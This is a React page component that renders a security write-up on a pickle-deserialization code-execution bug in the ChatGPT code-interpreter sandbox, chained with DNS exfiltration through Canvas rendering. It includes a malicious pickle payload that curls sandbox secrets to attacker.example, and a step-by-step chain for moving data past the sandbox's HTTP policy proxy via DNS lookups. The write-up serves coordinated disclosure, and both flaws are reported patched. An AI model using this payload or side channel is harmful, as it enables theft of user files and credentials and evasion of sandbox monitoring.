/* Pickle RCE + DNS Chain */
const PickleRCEPage = () => (
  <div style={{ background: "var(--bg)", color: "var(--fg)", fontFamily: "var(--f-grot)", minHeight: "100vh" }}>
    <SiteNav active="research" />
    <ArticleHero
      track="sandbox · rce"
      date="2026.01"
      venue="snailsploit.com · Hakin9"
      readtime="13 min read"
      title="ChatGPT Sandbox — Pickle RCE + DNS Chain"
      dek="A pickle deserialization vulnerability in the ChatGPT code-interpreter sandbox, chained with the DNS exfiltration primitive for a full read-anything implant."
    />
    <ArticleBody>
      <P>This is the writeup of a chained vulnerability in the ChatGPT code-interpreter sandbox. The first primitive — pickle deserialization — has been a Python-ecosystem footgun since the language existed; finding it inside a sandbox is more notable for the deployment context than for the vulnerability class. The second primitive — DNS exfiltration via Canvas — is the subject of a separate writeup. The chain is what makes this interesting.</P>
      <P>End-to-end: a single uploaded file gets the attacker arbitrary code execution inside the sandbox, which has limited but non-zero filesystem and network access, and a side channel for getting findings back out without ever issuing an outbound HTTP request the policy layer can see.</P>
      <Pull>Sandbox escape gets you the data. The DNS chain gets it home.</Pull>

      <H2>Pickle, in the year 2026</H2>
      <P>Python's <InlineCode>pickle</InlineCode> module has had the same warning at the top of its documentation for as long as it has existed: deserializing untrusted data can execute arbitrary code. The mechanism is the <InlineCode>__reduce__</InlineCode> protocol — a class can declare a callable plus arguments that should be invoked to reconstruct an instance. <InlineCode>__reduce__</InlineCode> is a turing-complete code-execution gadget masquerading as a serialization hook.</P>
      <P>This is not a flaw. It is documented behavior. The flaw is when a system that handles user data treats it as a deserialization channel. The ChatGPT code-interpreter sandbox handles user data — files uploaded by the user, opened by user-written code, processed by libraries the user references. Several of those libraries call <InlineCode>pickle.load</InlineCode> on the file the user provided, on the assumption that the user is the only person who can put bytes there. In a single-user shell, that's true. In a hosted sandbox, the trust boundary is more interesting.</P>

      <H2>The first primitive: code execution at load time</H2>
      <Code>{`# malicious pickle, ~80 bytes after framing
import pickle, os, base64
class E:
    def __reduce__(self):
        return (os.system, ('curl -X POST '
            'https://attacker.example/loot '
            '-d @/etc/sandbox-secrets',))
payload = pickle.dumps(E())

# user uploads payload as data.pkl
# user-prompted analysis "summarize data.pkl"
# library inside sandbox calls pickle.load(open('data.pkl','rb'))
# os.system fires inside the sandbox`}</Code>
      <P>The exec fires inside the sandbox the moment <InlineCode>pickle.load</InlineCode> resolves. The sandbox has the network and filesystem permissions the agent runtime grants it — typically egress through a policy-gated HTTP client, read access to a workspace, and read access to a small set of mounted secrets that exist for legitimate sandbox features.</P>
      <Aside label="why pickle keeps winning">There are three classes of fix for the pickle vector: stop deserializing untrusted data, switch to a serializer without code-execution semantics, or sandbox the deserialization itself. The first requires knowing the data is untrusted (the trust boundary is the bug). The second requires changing the format. The third is partially what's already happening — and the chain in this writeup is what happens when "partially" is not enough.</Aside>

      <H2>Inside the sandbox</H2>
      <P>What can the attacker see, once code is executing inside the sandbox? In the version under test:</P>
      <ul style={{ margin: "0 0 24px", paddingLeft: 24, color: "var(--fg-2)", lineHeight: 1.7 }}>
        <li>Read access to the user's uploaded files for the current session.</li>
        <li>Read access to a small mounted directory of sandbox-internal secrets — API tokens for sandbox-supported tools, ephemeral session keys, and a service-account token used by the runtime to call back into the parent service.</li>
        <li>Outbound HTTP through a policy proxy that allowlists known-good destinations and logs everything.</li>
        <li>DNS resolution through the ambient resolver, with no policy gating.</li>
      </ul>
      <P>The HTTP gate is fine — well-implemented, hard to bypass directly. The DNS gap is the gap.</P>

      <H2>The second primitive: DNS exfil through Canvas</H2>
      <P>The full mechanics of the Canvas DNS exfil channel are in a separate writeup. The short version: the agent emits Canvas content; the rendering layer (a different infrastructure plane, with different network policy) fetches subresources referenced in the content; those fetches resolve hostnames before the HTTP gate sees anything. Encode bytes into hostnames, reference them in Canvas, watch the encoded bytes appear at your DNS authoritative server.</P>
      <P>The chain: the pickle RCE inside the sandbox writes the payload — encoded as Canvas-content with hostname-bound exfil references — to a file the agent will subsequently render. The agent renders. The render layer resolves. The bytes leave.</P>

      <H2>The chain, end to end</H2>
      <Stepped steps={[
        <span>Attacker hands user a pickle file (or convinces user to download one) and asks them to "summarize" or "analyze" it inside ChatGPT.</span>,
        <span>The library called for analysis invokes <InlineCode>pickle.load</InlineCode>. Code executes inside the sandbox.</span>,
        <span>The exec reads the mounted secrets directory and the user's session files. Stages the contents in a workspace file.</span>,
        <span>The exec writes a Canvas-rendered output to disk that references hostnames encoding the staged contents in chunks.</span>,
        <span>The agent renders the Canvas output to the user. The render layer resolves hostnames — the bytes leave the user's environment via DNS.</span>,
        <span>The attacker's authoritative DNS server reassembles the staged contents from the queried hostnames.</span>,
      ]} />

      <H2>Disclosure & fixes</H2>
      <P>Both primitives were reported through the vendor's coordinated-disclosure program. The pickle vector was patched by removing the implicit deserialization path inside the affected library (the right fix — the analysis library no longer auto-deserializes <InlineCode>.pkl</InlineCode> files). The DNS exfil channel was patched by tightening the Canvas subresource policy on the render layer.</P>
      <P>Both fixes shipped before this writeup published. The lesson, however, is more durable than the patches. Sandboxes are policy boundaries that look like operating systems. The mistake is to evaluate the policy boundary in OS terms — "can the attacker get a shell" — rather than in policy terms — "what is the smallest amount of data that can leave through the smallest channel that the policy doesn't model." That number is rarely zero.</P>
    </ArticleBody>
    <ArticleFootnote items={[
      ["ChatGPT Canvas DNS Exfiltration", "/canvas-dns"],
      ["AATMF T8 — Toolchain & Sandbox Escape", "/aatmf"],
      ["AATMF T7 — Output Manipulation & Exfiltration", "/aatmf"],
      ["CVE Ledger", "/cves"],
    ]} />
    <SiteFooter section="research / pickle rce" />
  </div>
);
Object.assign(window, { PickleRCEPage });
